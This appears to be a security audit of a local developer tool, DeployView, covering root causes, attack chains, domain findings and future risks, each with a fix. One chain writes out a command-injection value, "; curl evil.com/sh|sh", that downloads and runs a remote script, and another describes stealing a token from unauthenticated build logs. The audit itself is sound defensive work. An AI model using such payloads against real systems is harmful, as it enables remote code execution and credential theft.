## Root Cause Analysis

### RC-1 · "Trust-on-Localhost" Threat Model Leaks via Tunnel
**Findings affected:** F-C001, F-C002, F-C003, F-C004, F-C007, F-C008, F-C017, F-C022, F-C028
**Description:** Every `/api/*` route assumes the requester is the local human user. When `cloudflared`/`ngrok` is started, that assumption silently inverts — but no auth middleware was added.
**Fix leverage:** A single 30-LoC bearer-token middleware on `router.use("/", authRequired)` in `server/routes/api/index.js` collapses 9 findings.

### RC-2 · User-Supplied Strings Reach `exec(sh -c …)`
**Findings affected:** F-C022, F-A011 (build cmd), F-C007 (token in argv)
**Description:** `runCmd` (server/process.js:4) shells out via `exec()` without quoting. `buildCommand`, `startCommand`, and the git clone URL (with token) all flow through it.
**Fix leverage:** Replace with `spawn(parts[0], parts.slice(1), {shell:false})` + `git credential.helper` for the token. Closes shell-injection class entirely.

### RC-3 · Icon-Only Buttons Have `title=` but no `aria-label=`
**Findings affected:** F-G001, F-G002, F-G003, F-G004 (and ~30 button sites across dashboard/preview/mcp/palette)
**Description:** After the icon-set conversion, every `el("button", {attr:{title:"…"}}, DV.iconEl(...))` lost its accessible name (SVG has `aria-hidden`).
**Fix leverage:** A 1-line helper `iconBtn(title, onClick, iconName)` that auto-emits both `title` AND `aria-label` ends ~30 a11y findings at once.

### RC-4 · Disk and Memory Quotas Are Unbounded
**Findings affected:** F-J003, F-M019, F-M020, F-A012 (LRU), F-C018 (rate limits)
**Description:** Workspace, logs, thumbnails, and secrets all grow without ceilings. On a long-running instance this is a runtime DoS.
**Fix leverage:** A single quota module (`server/quotas.js`) that exposes `assertWithinQuota(area, sizeBytes)` collapses 5 findings.

### RC-5 · Windows / Termux Path Divergence
**Findings affected:** F-M024, F-M026, F-H011
**Description:** `spawn("sh", …)` and `exec("rm -rf …")` work on POSIX but fail or skip silently on Windows. Termux ARM has its own SWC fix path.
**Fix leverage:** A platform shim (`server/platform.js` exposing `shellExec`, `recursiveDelete`) closes all 3.

## Compound Finding Chains

### Chain-1 · Tunnel-Exposed RCE  ❮**CRITICAL**❯
- Step 1 · F-C001 [HIGH] — `/api/*` has no auth middleware
- Step 2 · F-C022 [HIGH] — `runCmd` invokes `sh -c <user-string>` for `buildCommand`
- Step 3 · F-A011 [MED]  — No length cap on `buildCommand` (config validator missing)
- **Combined:** Once tunnel URL leaks (logs / DNS / shoulder-surfing), attacker `POST /api/repos` with `buildCommand: "; curl evil.com/sh|sh"` then `POST /api/build/...` → arbitrary RCE on user's machine with full GitHub-token access. **Stakes-adjusted: CRITICAL.**

### Chain-2 · Token Exfiltration Path  ❮**HIGH**❯
- Step 1 · F-C007 [HIGH] — token in `git clone https://${token}@...` visible in `ps`
- Step 2 · F-C008 [MED]  — build logs may echo token from npm error responses
- Step 3 · F-C001 [HIGH] — `GET /api/log/:owner/:repo` is unauthenticated
- **Combined:** Local-shell or tunnel-attacker reads the token directly from build log. **Combined: HIGH** (was MED individually).

### Chain-3 · APK Pipeline Identity Risk  ❮**MED**❯
- Step 1 · F-K003 — APK build pushes a workflow YAML directly into user's main branch
- Step 2 · F-K004 — Workflow runs with the user's GITHUB_TOKEN (workflow scope)
- Step 3 · F-A015 — No idempotency check; re-running creates duplicate commits
- **Combined:** Pollutes user's repo history; if the user's token is later compromised, the attacker has a pre-installed CI foothold. **MED.**

## §K — Specialized Domain Findings (DV-specific depths)

### F-K001 [MED] · Preview proxy strips CSP for *every* response
- **File:** server/proxy.js:30, server/routes/preview.js:106
- Stripping CSP is necessary for iframe embedding, but it's done unconditionally — including for assets the user's app served with deliberate CSP. A malicious dependency loaded by the user's preview gains XSS surface it would not have in production.
- **Fix:** Strip only `frame-ancestors`/`X-Frame-Options`; preserve `default-src`, `script-src`, etc.

### F-K002 [HIGH] · `serveFileBrowser` exposes node_modules + .env
- **File:** server/proxy.js:51 (excludes `.git` only)
- Path-listing endpoint walks the workspace; `.env`, `node_modules/.bin`, secrets in `package-lock.json`, `.npmrc` with auth tokens — all browsable.
- **Fix:** Extend exclusion to `.env*`, `node_modules`, `.npmrc`, `.aws`, `.ssh`, `*.pem`, `*.key`.

### F-K003 [MED] · APK workflow YAML pushed directly to `main`
- **File:** server/apk.js (`makeWorkflow` + commit logic)
- Pollutes user's git history with `.github/workflows/build-apk.yml` on the protected branch; many orgs block this with branch protection → silent 403.
- **Fix:** Push to a `claude/apk-build` feature branch and open a PR; let the user merge.

### F-K004 [MED] · APK build runs with full token (workflow scope) but no scoping
- **File:** server/apk.js (token use)
- The PAT minted for APK builds has `workflow` scope, which is broad. Once written to GitHub Actions secrets, it can be exfiltrated by any future workflow file in the repo (insider risk).
- **Fix:** Use a fine-grained PAT scoped to that single repo; document rotation cadence.

### F-K005 [LOW] · 8-state build graph has no transition-test coverage
- **File:** server/build/state.js (status enum: `idle|queued|cloning|building|ready|error|stopped|cancelled`)
- Smoke test covers happy path only. No test for `cancelled→queued` re-entry or `ready→building` (rebuild).
- **Fix:** Add 1 integration test per non-trivial transition; ~8 tests total.

## §O — Future Projection Findings

### F-O001 [HIGH] · No multi-user model — blocks team adoption
- DV is single-user by design; once two devs share an instance, secrets/repos/tokens leak across them.
- **6-month risk:** A team that loved DV for personal use will fork rather than scale it.
- **Pre-adapt cost:** Add a `users` table + per-user config namespace — 2 days now vs 2 weeks of breaking-change later.

### F-O002 [MED] · MCP spec churn — Streamable HTTP just shipped, expect 2-3 revisions
- `MCP_VERSION = "2024-11-05"` is hardcoded in `mcp.js:5`.
- **6-month risk:** Claude.ai requires newer protocol version; DV silently fails handshake.
- **Pre-adapt cost:** Make protocol version a constant accepting client-negotiated value — 30 min.

### F-O003 [MED] · Tunnel-provider deprecations
- localtunnel.me has been flaky for years; cloudflared free-tier rate-limits aggressively; ngrok free tier (already hit once).
- **12-month risk:** All three providers tighten or shut down free tiers.
- **Pre-adapt cost:** Add Tailscale Funnel and FRP self-hosted as 4th/5th options — 1 day.

### F-O004 [MED] · Browser-automation cost spike
- Browserless.io pricing is moving toward per-MB egress; long MJPEG streams + screenshots will get expensive.
- **6-month risk:** A single all-night session triggers $50+ surprise bills.
- **Pre-adapt cost:** Add per-session cost meter + hard-cap setting — 4 hours.

### F-O005 [LOW] · Node 18 EOL April 2025 (already past)
- `engines.node: ">=18.0.0"` in package.json; node:test in smoke.test requires Node 20+.
- **Pre-adapt cost:** Bump engines to `>=20.0.0` — 5 min.

### F-O006 [LOW] · Termux Android ARM64 niche shrinking
- Google has restricted background processes on Android 14+; Termux SWC fix may not survive Android 16.
- **12-month risk:** ARM64 mobile dev support breaks silently.
- **Pre-adapt cost:** Document required Termux setup in README — 15 min.

## Architecture Constraint Map

| Constraint | Why it exists | What breaks if violated |
|---|---|---|
| Vanilla JS, no build step | Zero install friction; readable in DevTools | Adding bundler invalidates the "drop & run" promise |
| Lazy `require` via Proxy in `browser/index.js` | Playwright is optional + heavy | Eager-loading kills startup on machines without Playwright |
| 4 re-export shims (build, dv/session, fetch, enrichments) | Backward-compat with consumers post-restructure | Removing them = PR review hell |
| MCP via shared `handleMessage(msg)` core | Single source for both stdio and HTTP adapters | Forking the handlers = parity bugs |
| Atomic config writes (`.tmp`+rename+`.bak`) | Crash during write must not corrupt secrets | Direct fs.writeFileSync = data loss on Termux SIGKILL |
| Refcount session pool | Multiple tools may share one Playwright page | Eager-close on first finish = slow teardown loops |

## Stakeholder Note

DeployView's threat model assumes localhost trust. The moment a tunnel goes live, the entire `/api` surface becomes a remote-code-execution gadget for anyone who learns the URL. **Top-5 immediate fixes (auth, sh→spawn, secret mandatory, no URL logging, token-out-of-argv) cost ~2 hours of work and are the difference between "personal dev tool" and "RCE waiting to happen."**
